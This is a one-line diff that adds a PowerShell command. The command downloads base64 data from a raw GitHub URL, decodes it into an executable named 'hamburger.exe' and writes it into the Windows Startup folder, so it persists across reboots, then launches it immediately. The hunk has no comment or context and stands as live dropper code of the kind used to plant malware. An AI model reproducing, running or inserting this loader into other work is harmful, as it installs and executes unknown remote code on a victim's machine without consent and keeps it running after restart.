@@ -1,0 +1,1 @@
+[IO.File]::WriteAllBytes("$env:APPDATA/Microsoft/Windows/Start Menu/Programs/Startup/hamburger.exe", [Convert]::FromBase64String((Invoke-webrequest -URI "https://raw.githubusercontent.com/alex-X-12/Atomix-fuze/main/b64.txt").Content)); Start-Process -FilePath "$env:APPDATA/Microsoft/Windows/Start Menu/Programs/Startup/hamburger.exe"
